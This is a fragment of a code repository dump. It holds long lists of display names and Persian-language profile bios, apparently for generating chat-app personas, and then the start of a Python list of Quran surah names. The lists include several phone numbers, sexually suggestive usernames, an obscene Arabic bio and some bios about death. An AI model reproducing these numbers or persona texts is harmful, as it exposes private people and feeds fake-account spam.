        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "الـیـنــا 🌷",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "(♥‿♥) Pani (♥‿♥)",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "Azrael",
        "Ranault",
        "Nader",
        "fuk",
        "ترنم😚🧚‍♀️",
        "ᴋᴏᴡsᴀʀ 🍂🍕",
        "ھـلـنــــا 💖",
        "Яркий",
        "▸‌↳‌🌴🌸ᕼᗩᑎᎩᗴ",
        "Moe83",
        "Vc87",
        "Monaa",
        "🦁тигир🦁",
        "H9",
        "(803) 891-8642",
        "سیمین",
        "3",
        "🅺🅰🆃🅸",
        "sg ggh",
        "bdjdidjd",
        "۲۳",
        "jdnd",
        "isuuj",
        "hfhdhd",
        "ytnd",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "H Nazanin 🍂-/♡",
        "𝑓𝑎𝑡𝑒𝑚𝑒ℎ",
        "Møbìną",
        "خالی",
        "(803) 897-9616",
        "بحد",
        "Feyzullah",
        "𝓐𝓛𝓘 • ❥˓",
        "Bandit",
        "13",
        "(803) 897-9316",
        "(803) 897-9538",
        "😈",
        "Jinoos",
        "Trey60",
        "مصطفام",
        "H13",
        "کتاب",
        "هاوین۶",
        "Vx09",
        "Call",
        "چهار",
        "8",
        "Ji",
        "2303",
        "🅺🅰🆃🅸",
        "7",
        "duhpo",
        "easx",
        "asdx",
        "rhrjjdjd",
        "sbdvr",
        "opfc",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "لیلا",
        "2heie",
        "◇PaRaStoO◇",
        "🅐🅛🅘 🅙. 🅗🅐🅢🅢🅐🅝",
        "thammer",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        "William",
        "ihbh3",
        "m1",
        "برهوم",
        "😎 Negin 🍒👙",
        "☀️ Eli 👙",
        "👙🦋 Delbar",
        "Sara👙S e x",
        "Sophie",
        "مریمی🖤",
        "(»◡«) angel (»◡«)",
        "Life is beautiful😔but not for me",
        "",
        "(»◡«) angel (»◡«)",
        "",
        "(»◡«) angel (»◡«)",
        "دزسسث",
        "Zvezda",
        ".......",
        "ستاره",
        "kaosd",
        "🦋 Roxana Rose🌹",
        "🧿🧿🧿 SARA",
        "💜💜",
        "nasrin",
        "☺️ Sanaz 🌧👙",
        "💜💜",
        "☺️ Sanaz 🌧👙",
        "🤗💋 Fereshteh 💋👙",
        "(»◡«) angel (»◡«)",
        "damn it👺boy",
        "i am a honey-eyed girl",
        "Pippa",
        "(»◡«) angel (»◡«)",
        "",
        "(»◡«) angel (»◡«)",
        "i am a honey-eyed girl",
        "i am a honey-eyed girl",
        "(»◡«) angel (»◡«)",
        "",
        "damn it👺boy",
        "damn it👺boy",
        "پوچ",
        "ღ(¯◕‿◕´¯) ♫ ♪ ♫ Night Girl ♫ ♪ ♫ (¯◕‿◕´¯)ღ",
        "🔞 Sara 🔱",
        "👙🧜‍♀️ Setareh",
        "👙🌙 Nafas",
        "نازنین زهرا🐭",
        "if you want a story 🙊 let me tell you",
        "مریم",
        "Kgfhh",
        "(»◡«) angel (»◡«)",
        "👙👙 Niki 💄💄",
        "damn it👺boy",
        "i am a honey-eyed girl",
        "(»◡«) angel (»◡«)",
        "(»◡«) angel (»◡«)",
        "",
        "i am a honey-eyed girl",
        "(»◡«) angel (»◡«)",
        "(»◡«) angel (»◡«)",
        "",
        "ღ꧁ღ╭⊱ꕥ sarina ꕥ⊱╮ღ꧂ღ",
        "damn it👺boy",
        "damn it👺boy",
        "damn it👺boy",
        "damn it👺boy",
        "raha",
        "🅺🅰🆃🅸",
        "سمیرا نصیری",
        "if you want a story 🙊 let me tell you",
        "sexy lady",
        "damn it👺boy",
        "",
        "i am a honey-eyed girl",
        "i am a honey-eyed girl",
        "angel 🌺",
        "damn it👺boy",
        "damn it👺boy",
        "i am a honey-eyed girl",
        "i am a honey-eyed girl",
        "sara ❤️",
        "selena 1",
        "damn it👺boy",
        "sara ❤️",
        "i am a honey-eyed girl",
        "i am a honey-eyed girl",
        "فریبا🥶",
        "angel 🌺",
        "sara ❤️",
        "i am a honey-eyed girl",
        "sara ❤️",
        "damn it👺boy",
        "damn it👺boy",
        "damn it👺boy",
        "amjad",
        "eat and smell my neck",
        "i am a honey-eyed girl",
        "فریبا👩‍🦰",
        "• Helia • CXY",
        "maria",
        "damn it👺boy",
        "💦Elena-Rose🌹",
        "a girl in the field with bare feet",
        "a girl in the field with bare feet",
        "a girl in the field with bare feet",
        "damn it👺boy",
        "زیــبا",
        "zara 🔥",
        "sexy lady",
        "maria",
        "maria",
        "ندا",
        "فتى عربي لنتكلم",
        "damn it👺boy",
        "yalda",
        "maria",
        "eat and smell my neck",
        "💖بهار💖",
        "ღ꧁ღ╭⊱ꕥ sarina ꕥ⊱╮ღ꧂ღ",
        "elnaz💔",
        "eat and smell my neck",
        "sexy lady",
        "zara 🔥",
        "eat and smell my neck",
        "damn it👺boy",
        "eat and smell my neck",
        "ღ꧁ღ╭⊱ꕥ sarina ꕥ⊱╮ღ꧂ღ",
        "eat and smell my neck",
        "(»◡«) angel (»◡«)",
        "angel 🌺",
        "i am a honey-eyed girl",
        "damn it👺boy",
        "👿",
        "(»◡«) angel (»◡«)",
        "",
        "",
        "a girl in the field with bare feet",
        "a girl in the field with bare feet",
        "a girl in the field with bare feet",
        "🌀َArmita👙",
        "eat and smell my neck",
        "maria",
        "maria",
        "damn it👺boy",
        "bek",
        "i am a honey-eyed girl",
        "(»◡«) angel (»◡«)",
        "eat and smell my neck",
        "a girl in the field with bare feet",
        "💖بهار💖",
        "maryam",
        "a girl in the field with bare feet",
        "eat and smell my neck",
        "الفتى العربي حبي",
        "a girl in the field with bare feet",
        "maryam",
        "eat and smell my neck",
        "a girl in the field with bare feet",
        "🥀",
        "😶‍🌫️👙 Sepideh 👙😶‍🌫️",
        "👙 Yegane 🍩",
        "fgicgii",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "🍕 Niyusha 👙",
        "🙊Romi Rain💦💋",
        "Let's just talk boy",
        "RED",
        "اسمي سارة وأنا أبحث عن فتى طويل وسيم",
        "يشتكي",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "Let's just talk boy",
        "saxdf",
        "fhdndjds",
        "ebebejej",
        "rjrjrjbr",
        "ღ(¯◕‿◕´¯) ♫ ♪ ♫ Night Girl ♫ ♪ ♫ (¯◕‿◕´¯)ღ",
        "ღ(¯◕‿◕´¯) ♫ ♪ ♫ Night Girl ♫ ♪ ♫ (¯◕‿◕´¯)ღ",
        "😡",
        "😡",
        "جلسه",
        "۲۶",
        "۲۲",
        "۳۷",
        "RED",
        "خیرنوش",
        "بمانی",
        "wvrvgw",
        "∙∙·▫️▫️ᵒᴼᵒ▫️ₒₒ▫️ᵒᴼᵒ▫️ₒₒ▫️ᵒᴼᵒ عسل ناز ᵒᴼᵒ▫️ₒₒ▫️ᵒᴼᵒ▫️ₒₒ▫️ᵒᴼᵒ▫️▫️·∙",
        "zahra",
        "😱",
        "a girl in the field with bare feet",
        "Iren",
        "adfy",
        "*•.¸♡ مهلا ♡¸.•*",
        "ا ⃟꯭❦⃟꯭⪻꯭Ꮖ꯭Ꮇ꯭⇨[꯭Ꮋ‌‌꯭]ᴀ꯭ⷶᴢ꯭꯭ᷦʀᷢᴀ꯭ⷶᴛⷮ|»꯭ʙ꯭ɪ»꯭|꯭꯭ᴀ꯭ⷶs꯭ᷤᴀ꯭ⷶᏴ꯭⪼⃟꯭❦⃟꯭♕",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) American girl (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "⚘ستـ𖤓۪۪͜͡𝕤𝕖𝕥𝕒𝕪𝕖𝕤𝕙۪۪͜͡͡𖤓ـایـ𖡦۪۪ٜ͡.۪۪ٜ͜ـش⚘",
        "کـــــیانا",
        "شجریان",
        "grh4h4",
        "dorsa",
        "gdjehs",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "░s░a░r░i░n░a░",
        "H17",
        "",
        "هاج",
        "پریا",
        "Bahar",
        "88",
        "Lale",
        "Mina",
        "𝖘𝖆𝖗",
        "ترانه",
        "ⓩⓐⓗⓡⓐ",
        "sanaz",
        "Yalda",
        "Fatane",
        "nazanin",
        "yasna",
        "giusaiu",
        "sara:-)",
        "maryam",
        "🔥🧜‍♀",
        "🅺🅰🆃🅸",
        "Raha",
        "مهتاب",
        "خاله",
        "Q32",
        "😈KING😈",
        "روژیــڹا ⚡️",
        "jpodf",
        "꧁roya꧂",
        "diehdu",
        "djdhsjs",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "علی",
        "hdjsbdjs",
        "˜”*°•.˜”*°• نرگس •°*”˜.•°*”˜",
        "mahsa",
        "دنیا",
        "Donyyya",
        "5",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "taoipd",
        "Mahla",
        "دریا",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "Bd838",
        "maryam",
        "دُڂتࢪڪ تنہا⛱",
        "King of the Castle",
        "عاشقی",
        "∙∙·▫️▫️ᵒᴼᵒ▫️ₒₒ▫️ᵒᴼᵒ▫️ₒₒ▫️ᵒᴼᵒ عسل ناز ᵒᴼᵒ▫️ₒₒ▫️ᵒᴼᵒ▫️ₒₒ▫️ᵒᴼᵒ▫️▫️·∙",
        "صالځـــــہ 🕊",
        "آسمان",
        "Dh28",
        "░B░i░t░a░",
        "آلـــــݦا 🍎",
        "دلکم",
        "رها",
        "꧁roya꧂",
        "دیسک",
        "ڝوفیـــــآ 🐥",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "",
        "نرگس",
        "آدمک",
        "پریا",
        "Donya",
        "مریم",
        "alexlitl7",
        "Prox",
        "مریم",
        "عسلی",
        "Be mike",
        "هاشم لو",
        "𝓼𝓪𝓻𝓪",
        "Sahar",
        "·.¸¸.·♩♪♫ Delsa Naaz ♫♪♩·.¸¸.·",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "↤↤↤↤↤ درسا بانو ↦↦↦↦↦",
        "لیلا(-:",
        "ghjj",
        "sahar",
        "🐼🐾𝚵➢ᎪxᏒᎾᏒ🌙🇺🇿🇲࿆࿆࿆𝙻࿆࿆࿆𝚊࿆࿆࿆𝚃࿆࿆࿆࿆ꮤ࿆𝚈࿆ι࿆𝚵➣Ꮮ࿆𝚒࿆Ꮮ࿆𝚵➣ω࿆εε࿆ϒк࿆х࿆",
        "¸„.-•~¹°”ˆ˜¨ آتریسا خانم ¨˜ˆ”°¹~•-.„¸",
        "Helema",
        "𝓼𝓪𝓻𝓪",
        "45",
        "پریا",
        "🆂🅰️🆁",
        "˜”*°•.˜”*°• پریسا •°*”˜.•°*”˜",
        "Asal",
        "♝🍧 هدیه 💋🎈",
        "Asfo",
        "hxnfj",
        "Mehri",
        "░s░a░r░i░n░a░",
        "hdjfhd",
        "人人人 مریم 人人人",
        "14",
        "kiou",
        "asma",
        "sanaz",
        "✧🌌 🎀 فرشته 🎀 🌌✧",
        "😹 Nina 🤎",
        "تريستان(البايو)",
        "baran",
        "ｎａｚ",
        "خسته شدم",
        "ایناز",
        "Raha",
        "Admin",
        "Pari",
        "Sensiz hayot kerakmas",
        "اول",
        "u",
        "yalda",
        "کوثر",
        "یلدا",
        "(♥‿♥) Pani (♥‿♥)",
        "Fateme",
        "bache koni",
        "(619) 500-0305",
        "-𝐒𝐀𝐇𝐀𝐑",
        "🎸 Rokhsar 🧑‍🎤",
        "henidj",
        "کوثر",
        "A",
        "░▒▓█ پرستو زیبا █▓▒░",
        "Sara",
        "narges",
        "sbejh",
        "💤📿roya📿💤",
        "ྨᴀᴍɪʀྼ",
        "سه",
        "maral",
        "گرفت",
        "dhdk",
        "",
        ".•♫•♬• سپیده •♬•♫•.",
        "donya",
        ".هستی",
        "ehencj",
        "elham",
        "ناظم",
        "Raha",
        "ｒｏｙａ",
        "یاس",
        "dbfjsh",
        "Men gomoseksualligimni yaxshi ko'raman",
        "rhejdj",
        "maryam",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "کولاک",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "🍌 Parmis 💘",
        "",
        "hdjdf",
        "فریبا",
        "گلی",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "awswe",
        "Sara",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "¸„.-•~¹°”ˆ˜¨ نازنین ¨˜ˆ",
        "˜”*°•.˜”*°• پریسا •°*”˜.•°*”˜",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "░M░e░l░ ░M░e░l░",
        "☹️🐚 نگین ♬👻",
        "H3",
        "🐇 ⋆ 🐙 🎀 𝓈𝒶𝓇𝒶 🎀 🐙 ⋆ 🐇",
        "jrjr",
        "azere",
        "xg",
        "🅺🅰🆃🅸",
        "(803) 674-3058",
        "░M░e░l░ ░M░e░l░",
        "(♥‿♥) Pani (♥‿♥)",
        "░M░e░l░ ░M░e░l░",
        "sexy fake saxy",
        "رویا",
        "≋̮̑m̮̮̑̑ȃ̮̮̑ȓ̮̮̑y̮̮̑̑ȃ̮̮̑m̮̑≋",
        "✼ ҉ elmira ҉ ✼",
        "░M░e░l░ ░M░e░l░",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "shima",
        "donya",
        "🅽🅰️🆉",
        "🐚♙ دنیا ☠️💘",
        "ایناز",
        "(♥‿♥) Pani (♥‿♥)",
        "پریا",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "░M░e░l░ ░M░e░l░",
        "👌🐣 ایدا 💋🐧",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "Men gomoseksualligimni yaxshi ko'raman",
        "Roya",
        "",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "",
        "Z♥️a♥️h♥️r♥️a",
        "هستی",
        "دنیا",
        "صبا",
        "کوثر",
        "░T░i░n░a░",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "🍕 Samar 🍒",
        "𝓔𝓵𝓱𝓪𝓶 𝓴𝓱𝓪𝓷𝓾𝓶",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "ｓａｈａｒ",
        "taniam",
        "ساناز",
        "baran",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "🙂Parisa🧜‍♀️",
        "🌈",
        "yalda",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "𝚜𝚊𝚛𝚒",
        "آذࢪ",
        "Rafa",
        "【﻿Ｅｌｎａｚ】",
        "asma",
        "~~<💚> sexy women <💚>~~",
        "💧 Yasna 🔞",
        "hana",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "𝐒𝐇𝐎𝐖𝐐",
        "ｎａｚ",
        "مهستی😛",
        "(♥‿♥) Pani (♥‿♥)",
        "💖 Faranak 👒",
        "NarGes",
        "░M░e░l░ ░M░e░l░",
        "(っ◔◡◔)っ ♥️ roya ♥️",
        "▀▄▀▄▀▄ مریم ▄▀▄▀▄▀",
        "˜”*°•.˜”*°• پریسا •°*”˜.•°*”˜",
        "𝒮𝒶𝒽𝒶𝓇",
        "sanaz",
        "yalda",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "#",
        "(っ◔◡◔)っ ♥️ فرناز ♥️",
        "Z♥️a♥️h♥️r♥️a",
        "ıllıllı مریم ıllıllı",
        "░▒▓█ یلـבا █▓▒░",
        "ترانه🌈",
        "tina🎈",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "کیمیا",
        "🌈",
        "😌 Rokhsar ☘️",
        "(っ◔◡◔)っ ♥️ نازنین زهرا ♥️",
        "🌈",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "Fatemeh",
        "🌈",
        "elnaz",
        "parisa😘💕",
        "✞༒Nafas༒✞",
        "✼ ҉ elmira ҉ ✼",
        "",
        "مهتاب",
        "shima",
        "مرضــ😉ــیه",
        "",
        "افسانه",
        "",
        "شوقر برذر birthday boy🥳",
        "☹️🐚 نگین ♬👻"
    ],
    "bios": [
        "من بی تو از رویای خود تنها ترم",
        "اول خودتو پیدا کُن بعد دُنبالِ نیمه گُمشدت بِگرد...",
        "اگه واسه همه لاتی واسه من پوست شکلاتی👎",
        "نزار سَر به سَرم من خودم دردسَرم!",
        "⚡️⚡️⚡️⚡️",
        "تو با تمام وجودت کنام باش ببین برات چیکار میکنم😍🙈",
        "من به روزهای شاد مشکوکم:[😕",
        "ی وختایی ی چیزایی سهمت نیس بفهم",
        "گاه باید خندید برغمی بی پایان🍃🍈",
        "I want to sleep for ever",
        "گر بدانی شوق دیدارت چی با دل میکند",
        "مغرور نیستم فقط : بهم ثابت شده توجه زیادی بی توجهی میاره",
        "من قهرمان زندگیمو تو آینه میبینم🤘",
        "❤️🌒 ماه همیشه تنهاست",
        "💔💔😔هعی",
        "بِ هَمآن اَندازِه کِ میخَندَمّ ،غَمگیّنَم :)",
        "من بي ادب نيستم... فقد بي حوصلم",
        "...",
        "مغرور باش جز خودت به هیشکی احتیاج نداری :)🤘🏻",
        "مشترک مورد نظر قلبش خاموش است بعدا محبت کنید",
        "من به روزهای شاد مشکوکم:[😕",
        "تنها باش ، تنها قدم بزن،ولی اضافه نباش",
        "خاطرم نیست...",
        "ᴏᴠᴇʀᴅᴏsᴇ ʙʏ ᴛʜɪɴᴋɪɴɢ ᴛᴏᴏ ᴍᴜᴄʜ",
        "مدلمه ب ت چه",
        "ᴏᴠᴇʀᴅᴏsᴇ ʙʏ ᴛʜɪɴᴋɪɴɢ ᴛᴏᴏ ᴍᴜᴄʜ",
        "نجنگ، جنگیدی نترس ،ترسیدی(( بمیر)))👊",
        "با افتخار یک نقاشی از خدا💜💜",
        "شـیـطـانـَمـ اَمـا فـِرِشـتـهـ هـا دُنـبـالـَمـَنـ",
        "●━━── ɪ ʜᴀᴠᴇ ʟᴏᴛ ɴᴏᴛ ᴛᴏ sᴀʏ─⇆",
        "این دنیا پر از آدمای الکیه:)",
        "کاش من اونی بودم که هرلحظه دلتنگشی:)",
        "هر چقدݥ بہ خودٺ برسے ب‌از بہ مݧ نمیرسے😏",
        "سرتو بالا بگیرتاجت نیوفته",
        "تک پری یعنی قاطـــــــی نشدن باهر خــــــری",
        "یادرکم کن،یاشر کم کن",
        "Cute👙👗lady",
        "'Trust' Its our mistakes...",
        "مشترک مورد نظر قلبش خاموش است بعدا محبت کنید",
        "خنده ي من از گريه ام بدتره!👽",
        "مرگ درمانیست برای اتمام درد زندگی ...",
        "لعنت ب همه چیز",
        "شر نباش من خودم خدای شرم",
        "شر نباش من خودم خدای شرم",
        "الماس نیستم ولی کمتر کسی توان داشتنمو دارع",
        "دلم یکیو میخواد که تا تهش باشه😐😞",
        "➖⃟🍫••Ben ağladığım gece sen başkasına güldün",
        "ι need нappιly ғroм тнe вoттoм oғ мy нearт",
        "با ما باش بالا باش",
        "سرتو بالا بگیرتاجت نیوفته",
        "با ما باش بالا باش",
        "نزار سَر به سَرم من خودم دردسَرم!",
        "گر بدانی شوق دیدارت چی با دل میکند",
        "💋💋😔😔",
        "اگه چیزی گفتم که ناراحت شدی بگو دوباره بگم.",
        "با ما باش بالا باش",
        "من قهرمان زندگی امو تو آیینه می بینم",
        "ᴛʜɪs ʜᴇʟʟ ᴡᴀs ᴀ ʜᴇᴀᴠᴇɴ ᴏɴᴇ ᴅᴀʏ",
        "ستاره بخت ما چراغ هواپیما بود",
        "من همون دختری ام که واسه هیشکی مهم نیست♡",
        "بعد از من هیچکس تکرار من نخواهد شد",
        "گر بدانی شوق دیدارت چی با دل میکند",
        "My eyes met many eyes but only got lost in yours",
        "هر چقدݥ بہ خودٺ برسے ب‌از بہ مݧ نمیرسے😏",
        "مرگ درمانیست برای اتمام درد زندگی ...",
        "من دونفرم خودم غرورم",
        "",
        "بچه بیا پایین سرمون درد گرفت",
        "cute❄️❄️Axion",
        "جنگ بلد ولی صلح طلب",
        "....",
        "اخوي ديوث ينيكني",
        "مدلمه ب ت چه",
        "💦💦💦💦",
        "●━─ᵀᴵᴿᴱᴰ ᴼᶠ ˢᴬᴰ ᴸᴬᵁᴳᴴᵀᴱᴿ ──⇆",
        "رفیق تو که به ما نمیخوری حداقل دو تا پیک بزن به در و دیوار بخوری",
        "من همون دختری ام که واسه هیشکی مهم نیست♡",
        "cute👒👙Likeable",
        "تۅے دݩیاے ڪه هسټیمـ🖤 ڪݪمات بیشټــر از گݪولہ هآ ادݥ ڪشتنـ🙂💔",
        ":) ᴵᵗ ᵒᶜᶜᵘʳˢ ᵃᵗ ᵗʰᵉ ʰᵉⁱᵍʰᵗ ᵒᶠ ⁱⁿˢᵃⁿⁱᵗʸ",
        "اعشاق جهان عقل ندارند یعنی تو خری من به مراتب ز تو خر تر",
        "مغرور نیستم فقط : بهم ثابت شده توجه زیادی بی توجهی میاره",
        "تو حتی اگه الماس هم باشی بازم میتونی یه تیکه از تاج من باشی😏👌🏻",
        "مغرور نیستم فقط : بهم ثابت شده توجه زیادی بی توجهی میاره",
        "من قهرمان زندگی امو تو آیینه می بینم",
        "ᴛʜɪs ʜᴇʟʟ ᴡᴀs ᴀ ʜᴇᴀᴠᴇɴ ᴏɴᴇ ᴅᴀʏ",
        "horny💦💦princess",
        "من قهرمان زندگی امو تو آیینه می بینم",
        "اگه چیزی گفتم که ناراحت شدی بگو دوباره بگم.",
        "کاش من اونی بودم که هرلحظه دلتنگشی",
        "gguo6",
        "اخرین خنده خیلے وقت پیش...",
        "ᴏᴠᴇʀᴅᴏsᴇ ʙʏ ᴛʜɪɴᴋɪɴɢ ᴛᴏᴏ ᴍᴜᴄʜ",
        "💦💦💧💧💧💧",
        "من زندگی میکنم چون نمیتونم بمیرم.. ‌",
        "گرگ زاده را محتاج نوازش نیست!",
        "!:)Tᴏᴏ ɢʜᴀsᴀɴɢ ᴛᴀʀɪɴ ɢʜᴇsᴍᴀᴛ ᴢᴇɴᴅᴇɢɪ ᴍᴀɴ ʙᴏᴅɪ",
        "!:)Tᴏᴏ ɢʜᴀsᴀɴɢ ᴛᴀʀɪɴ ɢʜᴇsᴍᴀᴛ ᴢᴇɴᴅᴇɢɪ ᴍᴀɴ ʙᴏᴅɪ",
        "من زندگی میکنم چون نمیتونم بمیرم.. ‌",
        "لعنت ب همه چیز",
        "مثِ برف سرد ولی زیبا...❄️♥️",
        "مغرور باش جز خودت به هیشکی احتیاج نداری :)🤘🏻",
        "ᴅᴏɴ'ᴛ ᴛʀᴜsᴛ ᴀɴʏᴏɴᴇ ʟɪғᴇ ɪs ғᴜʟʟ ᴏғ ғᴀᴋᴇ ᴘᴇᴏᴘʟᴇ",
        "یادرکم کن،یاشر کم کن",
        "نفس کشیدن که زندگی کردن نیست!🖤✨",
        "چــه درونـم تنهــاسـت...",
        "ᴏᴠᴇʀᴅᴏsᴇ ʙʏ ᴛʜɪɴᴋɪɴɢ ᴛᴏᴏ ᴍᴜᴄʜ",
        "از چی بترسم؟وقتی من ترسناک ترم",
        "مثِ برف سرد ولی زیبا...❄️♥️",
        "ساقیا امشب صدایم با صدایــــــــت ساز نیـــــــست",
        "یادت باشه حتی کسایی ک ب درد نمی‌خورن هم دنبال ب درد بخوران😬😵",
        "🤍",
        "DoN'т Be A BaD ReAѕOn FoR PeOpLe",
        "من بي ادب نيستم... فقد بي حوصلم",
        "من تورا با خود تا خانه خود خواهم برد😌🙈",
        "میدونی دلت بخواد بمونی ولی مجبور باشی بری یعنی چی؟",
        ":) ᴵᵗ ᵒᶜᶜᵘʳˢ ᵃᵗ ᵗʰᵉ ʰᵉⁱᵍʰᵗ ᵒᶠ ⁱⁿˢᵃⁿⁱᵗʸ",
        "○━─ᴵ'ᴹ ᶠᵁᴸᴸ ᴼᶠ ᴾᴬᴵᴺ •͜• ──⇆",
        "این دنیا پر از آدمای الکیه:)",
        "🤍",
        "قبل لا يجرح العالم \" جَـرح نفسه \"",
        "توکه آهیویی گلم شکارچیات دست بوسمن",
        "زندگی فقط نفس کشیدن نیست...",
        "من ماندم واو رفت !",
        "رفیق تو که به ما نمیخوری حداقل دو تا پیک بزن به در و دیوار بخوری",
        "✿ 𝐼'𝓂 𝒶 𝑔𝒾𝓇𝓁 𝓌𝒾𝓉𝒽𝑜𝓊𝓉 𝑒𝓂𝑜𝓉𝒾𝑜𝓃 𝓁𝒾𝓀𝑒 𝒶 𝒸𝓁𝑜𝓊𝒹"
    ]
}
# ==================== FILE: quran.py ====================
TheHolyQuran = ["سورة الفاتحه", "سورة البقره", "سورة ال عمران", "سورة النساء", "سورة المائده", "سورة الانعام", "سورة الاعراف", "سورة الانفال", "سورة التوبه", "سورة يونس", "سورة هود", "سورة يوسف", "سورة الرعد", "سورة ابراهيم", "سورة الحجر", "سورة النحل", "سورة الاسراء", "سورة الكهف", "سورة مريم", "سورة طه", "سورة الانبياء", "سورة الحج", "سورة المؤمنون", "سورة النور", "سورة الفرقان", "سورة الشعراء", "سورة النمل", "سورة القصص", "سورة العنكبوت", "سورة الروم", "سورة لقمان", "سورة السجده", "سورة الاحزاب", "سورة سبا", "سورة فاطر", "سورة يس", "سورة الصافات", "سورة ص", "سورة الزمر", "سورة غافر", "سورة فصلت", "سورة الشورى", "سورة الزخرف", "سورة الدخان", "سورة الجاثيه", "سورة الاحقاف", "سورة محمد", "سورة الفتح", "سورة الحجرات", "سورة ق", "سورة الذريات", "سورة الطور", "سورة النجم", "سورة القمر", "سورة الرحمن", "سورة الواقعه", "سورة الحديد", "سورة المجادله", "سورة الحشر", "سورة الممتحنه", "سورة الصف", "سورة الجمعه", "سورة المنافقون", "سورة التغابن", "سورة الطلاق", "سورة التحريم", "سورة الملك", "سورة القلم", "سورة الحاقه", "سورة المعارج", "سورة نوح", "سورة الجن", "سورة المزمل", "سورة المدثر", "سورة القيامه", "سورة الانسان", "سورة المرسلات", "سورة النبا", "سورة النازعات", "سورة عبس", "سورة التكوير", "سورة الانفطار", "سورة المطففين", "سورة الانشقاق", "سورة البروج", "سورة الطارق", "سورة الاعلى", "سورة الغاشيه", "سورة الفجر", "سورة البلد", "سورة الشمس", "سورة الليل", "سورة الضحى", "سورة الشرح", "سورة التين", "سورة العلق", "سورة القدر", "سورة البينه", "سورة الزلزله", "سورة العاديات", "سورة القارعه", "سورة التكاثر", "سورة العصر", "سورة الهمزه", "سورة الفيل", "سورة قريش", "سورة الماعون", "سورة الكوثر", "سورة الكافرون", "سورة النصر", "سورة المسد", "سورة 